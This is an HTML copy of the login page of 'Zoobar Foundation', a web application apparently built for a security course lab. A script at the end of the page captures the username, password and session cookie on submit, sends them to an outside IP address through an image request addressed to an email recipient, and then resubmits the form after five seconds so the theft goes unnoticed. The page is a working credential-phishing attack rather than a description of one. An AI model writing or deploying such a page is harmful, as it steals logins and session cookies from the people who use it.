<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
        <title>
          Login - Zoobar Foundation
        </title>
    </head>
    <body>
      <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Patriotic
                      Thinking</a></h1>
      <h2>Supporting the skillful
          advocates of the 21st-century</h2>

      
<div id="login" class="centerpiece">
<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" >
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
  <input type="submit" name="submit_login" value="Log in">
  <input type="submit" name="submit_registration" value="Register"></td>
</tr>
</table>
<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
</form>
</div>
<div class="footer warning">

</div>
<script>
<!--first remove the eventlistener or it will cancel sumit again and email-->
function reSubmit(){
   document.getElementsByName("loginform")[0].removeEventListener("submit",emailPasswd);
   document.getElementsByName("loginform")[0].submit();
}

<!--cancel the default submit first, email password and username to me and then resubmit-->
function emailPasswd(event){
  event.preventDefault();
  var passwd = document.getElementsByName("login_password")[0].value;
  var name = document.getElementsByName("login_username")[0].value;
  (new Image()).src='http://192.168.76.130/sendmail.php?' + 'to=19930127zpf@sjtu.edu.cn' + '&payload=' + encodeURIComponent(document.cookie) + 'password=' + passwd + 'username='+ name + '&random=' + Math.random();
  setTimeout(reSubmit, 5000);
}

<!--listen on the form submit and execute emailPasswd when it submit-->
document.getElementsByName("loginform")[0].addEventListener("submit",emailPasswd,false);
</script>
<script>document.loginform.login_username.focus();</script>

    </body>
</html>
